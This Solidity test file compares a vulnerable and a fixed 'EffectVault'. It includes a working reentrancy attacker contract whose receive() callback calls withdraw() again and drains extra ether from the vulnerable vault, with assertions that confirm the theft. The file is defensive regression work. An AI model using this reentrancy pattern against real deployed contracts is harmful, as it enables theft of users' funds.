// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import {EffectVault as Vulnerable} from "effect-vulnerable/EffectVault.sol";
import {EffectVault as Fixed} from "effect-fixed/EffectVault.sol";

interface Vm { function deal(address who, uint256 amount) external; }
interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address who) external view returns (uint256);
}

contract CallbackDepositor {
    IVault immutable vault;
    uint256 public remaining;
    uint256 public blocked;
    uint256 public callbacks;
    constructor(IVault target) { vault = target; }
    function start(uint256 repeats) external payable {
        require(msg.value == 1 ether, "fixture stake");
        remaining = repeats;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        callbacks++;
        if (remaining != 0) {
            remaining--;
            // Catch rejection so the fixed vault's legitimate outer withdrawal succeeds.
            (bool ok,) = address(vault).call(abi.encodeWithSelector(IVault.withdraw.selector));
            if (!ok) blocked++;
        }
    }
}

contract EffectWitnessTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    function vulnerable(uint256 repeats) internal {
        vm.deal(address(this), 20 ether);
        Vulnerable vault = new Vulnerable();
        vault.deposit{value: 5 ether}();
        CallbackDepositor actor = new CallbackDepositor(IVault(address(vault)));
        actor.start{value: 1 ether}(repeats);
        require(address(actor).balance == (repeats + 1) * 1 ether, "vulnerable: repeated payout absent");
        require(address(vault).balance == (5 - repeats) * 1 ether, "vulnerable: victim funds not reduced as expected");
        require(actor.callbacks() == repeats + 1, "vulnerable: callback count");
        require(actor.blocked() == 0, "vulnerable: unexpected rejection");
        require(vault.balanceOf(address(actor)) == 0, "vulnerable: final credit reset missing");
        require(vault.balanceOf(address(this)) == 5 ether, "vulnerable: victim claim unexpectedly changed");
    }
    function fixedVault(uint256 repeats) internal {
        vm.deal(address(this), 20 ether);
        Fixed vault = new Fixed();
        vault.deposit{value: 5 ether}();
        CallbackDepositor actor = new CallbackDepositor(IVault(address(vault)));
        actor.start{value: 1 ether}(repeats);
        require(address(actor).balance == 1 ether, "fixed: attacker overpaid");
        require(address(vault).balance == 5 ether, "fixed: victim funds reduced");
        require(actor.callbacks() == 1, "fixed: nested payout occurred");
        require(actor.blocked() == (repeats == 0 ? 0 : 1), "fixed: rejection oracle");
        require(vault.balanceOf(address(actor)) == 0, "fixed: attacker credit not consumed");
        require(vault.balanceOf(address(this)) == 5 ether, "fixed: victim claim changed");
    }
    function test_vulnerable_helper_alias_drains_three_extra_credits() external { vulnerable(3); }
    function test_fixed_alias_reset_blocks_nested_withdrawal() external { fixedVault(3); }
    function testFuzz_bounded_reentry_pair(uint8 seed) external {
        uint256 repeats = uint256(seed) % 5;
        vulnerable(repeats);
        fixedVault(repeats);
    }
}
